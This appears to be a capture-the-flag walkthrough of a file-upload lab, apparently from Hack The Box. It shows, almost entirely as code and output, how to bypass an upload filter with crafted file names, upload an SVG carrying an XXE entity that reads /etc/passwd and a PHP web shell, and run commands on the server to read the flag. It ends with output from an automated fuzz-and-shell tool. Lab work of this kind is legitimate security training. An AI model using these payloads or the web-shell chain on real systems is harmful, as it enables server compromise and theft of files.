![module136-section10-question01-answer05](/assets/img/htb/mod136_sec10_q01_a05.png)

The raw request for intruder:
```
POST /contact/upload.php HTTP/1.1
Host: SERVER:PORT
Content-Length: 33480
X-Requested-With: XMLHttpRequest
Accept-Language: en-US,en;q=0.**9**
Accept: */*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvkXODXwvAZSLMAtx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Origin: http://SERVER:PORT
Referer: http://SERVER:PORT/contact/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

------WebKitFormBoundaryvkXODXwvAZSLMAtx
Content-Disposition: form-data; name="uploadFile"; filename="§test§"
Content-Type: image/svg+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>

<?php system('echo "Hello World"'); ?>
------WebKitFormBoundaryvkXODXwvAZSLMAtx--
```

After `Intruder` completes sending all the requests, we can modify the `check-exec.py` python script I provided in previous sections to check for execution..

```python
import requests

# Replace with your actual URL, SERVER, PORT and DATE
base_url = "http://SERVER:PORT/contact/user_feedback_submissions/250308_"

# Load the wordlist from the file
with open('wordlist-svg.txt', 'r') as file:
    extensions = file.readlines()

# Loop over each extension in the wordlist
for ext in extensions:
    ext = ext.strip()  # Remove leading/trailing whitespace/newlines
    
    # Make the HTTP request
    url = f"{base_url}{ext}"
    print(f"[{counter}/{len(extensions)}] {url}")
    try:
        response = requests.get(url)
		
		# Discard 404 and 403 and continue 
        if response.status_code == 404 or response.status_code == 403:
            continue
        
        # Clean the response content: strip out any extra newlines, spaces, or carriage returns
        response_text = response.text.strip()
        response_text = response_text.replace('\r', '')  # Remove carriage returns if any
        
        # Define the exact match string
        exact_match = '<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>\n<svg>&xxe;</svg>\n\nHello World'
        
        # Compare the cleaned response to the exact match
        if response_text == exact_match:
            print(f"[FOUND] Code execution with: {ext}")
    
    except requests.RequestException as e:
        # Handle potential exceptions like connection errors
        print(f"Error fetching {url}: {e}")

```

Results..

```shell
python3 check-exec.py
# This will check 144 possible filenames so give it time to complete..
[FOUND] Code execution with: shell..phar.svg
[FOUND] Code execution with: shell.phar..svg
[FOUND] Code execution with: shell….phar.svg
[FOUND] Code execution with: shell.phar….svg
[FOUND] Code execution with: shell:.phar.svg
[FOUND] Code execution with: shell.phar:.svg
```

Now that we know exactly which file extensions can get code execution, simply modify the payload to use the web shell we have used in previous sections using one of the filenames above.

I am using `shell:.phar.svg` but any of them should work..

![module136-section10-question01-answer04](/assets/img/htb/mod136_sec10_q01_a04.png)

```
POST /contact/upload.php HTTP/1.1
Host: SERVER:PORT
Content-Length: 354
X-Requested-With: XMLHttpRequest
Accept-Language: en-US,en;q=0.9
Accept: */*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvkXODXwvAZSLMAtx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Origin: http://SERVER:PORT
Referer: http://SERVER:PORT/contact/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

------WebKitFormBoundaryvkXODXwvAZSLMAtx
Content-Disposition: form-data; name="uploadFile"; filename="shell:.phar.svg"
Content-Type: image/svg+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>

<?php system($_REQUEST['cmd']); ?>
------WebKitFormBoundaryvkXODXwvAZSLMAtx--
```

We now have code execution! Let's try to get `/flag.txt` using `curl`...

```shell
curl -s "http://SERVER:PORT/contact/user_feedback_submissions/250309_shell:.phar.svg?cmd=cat%20/flag.txt"                                 
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>


```

hmm nothing showing up, so we can check the contents of the root directory with `ls` and `curl`...

```shell
curl -s "http://SERVER:PORT/contact/user_feedback_submissions/250308_shell:.phar.svg?cmd=ls%20/flag*"
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>

/flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt

```

Now we know the name of the flag we can grab it with...

```shell
curl -s "http://SERVER:PORT/contact/user_feedback_submissions/250308_shell:.phar.svg?cmd=cat%20/flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt"
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>

HTB{m4573r1ng_upl04d_3xpl0174710n}

```

Answer: `HTB{m4573r1ng_upl04d_3xpl0174710n}`

For those interested, I improved the checkexec.py script to both check for execution, upload a web shell if successful and you can issue commands directly through the tool, here is an example output...

```shell
python3 xxec.py -u http://SERVER:PORT/contact/upload.php -w extensions-svg-small.txt -c 'contact/user_feedback_submissions/250309_'

[TEST 1/36] Trying extension: ..php.svg
[UPLOAD SUCCESS] test..php.svg -> Checking execution...
Check URL: http://SERVER:PORT/contact/user_feedback_submissions/250309_test..php.svg
Response Status: 404

[TEST 2/36] Trying extension: .php..svg
[UPLOAD SUCCESS] test.php..svg -> Checking execution...
Check URL: http://SERVER:PORT/contact/user_feedback_submissions/250309_test.php..svg
Response Status: 404

[TEST 3/36] Trying extension: .svg..php
[UPLOAD SUCCESS] test.svg..php -> Checking execution...
Check URL: http://SERVER:PORT/contact/user_feedback_submissions/250309_test.svg..php
Response Status: 404

[TEST 4/36] Trying extension: ..phps.svg
[UPLOAD SUCCESS] test..phps.svg -> Checking execution...
Check URL: http://SERVER:PORT/contact/user_feedback_submissions/250309_test..phps.svg
Response Status: 404

[TEST 5/36] Trying extension: .phps..svg
[UPLOAD SUCCESS] test.phps..svg -> Checking execution...
Check URL: http://SERVER:PORT/contact/user_feedback_submissions/250309_test.phps..svg
Response Status: 404

[TEST 6/36] Trying extension: .svg..phps
[UPLOAD SUCCESS] test.svg..phps -> Checking execution...
Check URL: http://SERVER:PORT/contact/user_feedback_submissions/250309_test.svg..phps
Response Status: 403

[TEST 7/36] Trying extension: ..phar.svg
[UPLOAD SUCCESS] test..phar.svg -> Checking execution...
Check URL: http://SERVER:PORT/contact/user_feedback_submissions/250309_test..phar.svg
[CODE EXECUTION] SUCCESS: http://SERVER:PORT/contact/user_feedback_submissions/250309_test..phar.svg

[!] Detected execution. Deploy attack payload? (y/n): y
[UPLOAD SUCCESS] shell..phar.svg -> Checking execution...
[+] Webshell uploaded: http://SERVER:PORT/contact/user_feedback_submissions/250309_shell..phar.svg
Enter command to execute (or type 'exit' to stop): ls /
[COMMAND OUTPUT]

bin
boot
dev
etc
flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
Enter command to execute (or type 'exit' to stop): cat /flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt
[COMMAND OUTPUT]

HTB{m4573r1ng_upl04d_3xpl0174710n}
Enter command to execute (or type 'exit' to stop): 

```

This basically just makes the process of fuzzing, testing for code execution, uploading a web shell and issuing commands into a single command-line utility...

You can find the tool on my [GitHub](https://github.com/davewinton/xxec)